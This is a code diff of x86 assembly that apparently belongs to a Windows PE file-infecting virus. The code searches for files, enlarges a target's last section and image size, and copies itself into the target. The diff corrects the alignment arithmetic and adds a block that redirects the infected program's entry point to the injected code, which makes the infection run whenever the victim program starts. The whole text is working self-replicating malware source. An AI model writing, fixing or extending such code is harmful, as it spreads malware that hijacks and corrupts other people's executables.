@@ -308,9 +308,9 @@ loop_find_file:
 	; update it
 	mov (IMAGE_SECTION_HEADER PTR [edx]).Characteristics, eax
 
-	; Update VirtualSize using FileAlignment for consistency
+	; Update VirtualSize
 	mov eax, (IMAGE_SECTION_HEADER PTR [edx]).Misc
-	add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).FileAlignment
+	add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SectionAlignment
 	mov (IMAGE_SECTION_HEADER PTR [edx]).Misc, eax
 
 	; save where to inject in the target
@@ -320,13 +320,23 @@ loop_find_file:
 
 	; Update SizeOfRawData
 	mov eax, (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData
-	add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).FileAlignment
+	add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SectionAlignment
 	mov (IMAGE_SECTION_HEADER PTR [edx]).SizeOfRawData, eax
 
 	; Update SizeOfImage
 	mov eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SizeOfImage
 	add eax, (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SectionAlignment
 	mov (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).SizeOfImage, eax
+
+	; Update entry point
+	mov eax, (STACK_STORAGE PTR [esp]).offsetToDest
+	add eax, (start - data)
+	; raw address to virtual address
+	mov ecx, (IMAGE_SECTION_HEADER PTR [edx]).VirtualAddress
+	sub ecx, (IMAGE_SECTION_HEADER PTR [edx]).PointerToRawData
+	add eax, ecx
+	mov (IMAGE_OPTIONAL_HEADER PTR (IMAGE_NT_HEADERS PTR [edi]).OptionalHeader).AddressOfEntryPoint, eax
+
 
 	; re-map the file to memory and change its size
 	mov eax, (IMAGE_SECTION_HEADER PTR [edx]).PointerToRawData
@@ -338,7 +348,6 @@ loop_find_file:
 	push esp
 	push eax
 	call MapFileToRAM
-
 
 	; inject itself
 	mov esi, ebx                                                    ; src
